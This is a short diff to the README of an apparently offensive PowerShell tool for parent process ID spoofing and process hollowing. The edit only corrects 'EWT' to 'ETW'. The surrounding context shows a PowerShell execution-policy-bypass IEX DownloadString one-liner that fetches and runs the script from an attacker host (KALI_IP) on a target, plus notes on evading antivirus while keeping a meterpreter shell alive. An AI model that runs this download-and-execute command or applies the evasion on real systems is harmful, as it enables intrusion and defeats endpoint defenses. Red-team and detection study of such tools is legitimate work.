@@ -46,7 +46,7 @@ YouTube (higher resolution): https://www.youtube.com/watch?v=GB59m-KJvd0
 4. On your target machine `powershell -ep Bypass -c IEX(New-Object System.Net.WebClient).DownloadString('http://KALI_IP:8088/Reflective-PPIDxProcHollow_v1.2.ps1')`
 
 ## Disclaimer
-As we are performing parent process ID spoofing, it can be detected via Event Tracing for Windows (EWT).
+As we are performing parent process ID spoofing, it can be detected via Event Tracing for Windows (ETW).
 
 ## Evading AV
 - The v1.0 script creates an alert on Windows Defender upon launching cmd.exe from meterpreter shell. However, your meterpreter shell will still be **kept alive** despite the alert.
